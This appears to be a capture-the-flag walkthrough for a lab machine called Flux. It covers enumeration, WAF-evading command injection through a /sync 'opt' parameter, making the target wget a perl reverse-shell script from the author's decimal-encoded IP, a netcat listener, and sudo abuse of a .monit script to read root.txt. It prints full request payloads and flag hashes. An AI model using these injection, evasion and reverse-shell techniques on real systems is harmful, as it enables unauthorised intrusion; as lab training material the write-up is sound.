flux

1) nmap shows that only port 80 is open.

2) The webseite responds as:

OK: node1 alive 

FluxCapacitor Inc. info@fluxcapacitor.htb - http://fluxcapacitor.htb
Roads? Where we're going, we don't need roads.

3) Source code has an interesting piece:

<!--
		Please, add timestamp with something like:
		<script> $.ajax({ type: "GET", url: '/sync' }); </script>
-->

This shows that there is a directory /sync

4) Going to the directory gives us a 403 forbidden error.

5) Issuing a curl command against it 'curl http://10.10.10.69/sync', the server responds with the current timestamp. This shows there is a possibility that a script is running which may be exploited.

6) Running a wfuzz against it with a wordlist with header of timestamp using:

wfuzz -c -w ~/Documents/SecLists/Discovery/Web_Content/raft-large-directories.txt -H "Date: Wed, 14 Feb 2018 17:56:37 GMT" "http://10.10.10.69/sync?FUZZ='"

It is found that the 'opt' parameter responds with different characters size. Thus, this may be used for an RCE.

7) To find out this RCE a request was captured in Burp as sent to repeater:

GET /sync?opt=' HTTP/1.1
Host: 10.10.10.69
User-Agent: abc
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1

**It is important to note that User-agent needs to be changed.

8) Execution could not be acheived directly thus wildcards need to be used. 

https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0

9) the following request was used to execute 'ls':

GET /sync?opt=' l''s' HTTP/1.1
Host: 10.10.10.69
User-Agent: abc
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1

10) Next step was to get a reverse shell. It was identified that perl was running available on the machine using the following request:

GET /sync?opt=' wh''ic''h p''er''l' HTTP/1.1
Host: 10.10.10.69
User-Agent: abc
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1

11) Thus, an HTTP server was created on my machine using python to a perl reverse shell script from github. The following command was used:

pythom -m SimpleHTTPServer

** Note that the perl script need to be edited to your listing IP and the port number you are planning to be used.
** The perl script was also renamed to 'a.pl' for convenience.

12) The following request was made to the box for it to download the perl script from my machine to the box in the tmp folder:

GET /sync?opt=' wg''et http://168431628:8000/''a.''pl'' -P tmp' HTTP/1.1
Host: 10.10.10.69
User-Agent: abc
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1

** Note the the IP has been decimal encoded.

13) A listerner was created using:

nc -nlp 10.10.16.12 4444

14) The following request was sent to the box to execute the perl script:

GET /sync?opt=' p''erl /tmp/a.pl' HTTP/1.1
Host: 10.10.10.69
User-Agent: abc
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1

15) Reverse shell was acheived. The user.txt was found to be in /home/FluxCapacitorInc but couldn't 'cd' into it. Thus, the follwoing was done:

ls /home/FluxCapacitorInc/
cat /home/FluxCapacitorInc/user.txt

The following was the hash: b8b6d46c893d0cd00c0f0380036117bc

16) For priv esc. 'sudo -l' was executed. The following was the result:

Matching Defaults entries for nobody on fluxcapacitor:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nobody may run the following commands on fluxcapacitor:
    (ALL) ALL
    (root) NOPASSWD: /home/themiddle/.monit

17) This means that the '/home/themiddle/.monit' script can be executed using sudo by the 'nobody' user.

18) The '.monit' script was examined using 'cat /home/themiddle/.monit'. It was observed that when the first argument was 'cmd' and the second argument was a base64 encoded command. It could be executed. Since this was run as sudo. The /root/root.txt could be catted.

sudo ./.monit cmd Y2F0IC9yb290L3Jvb3QudHh0

19) The following wass the root hash: bdc89b40eda244649072189a8438b30e 
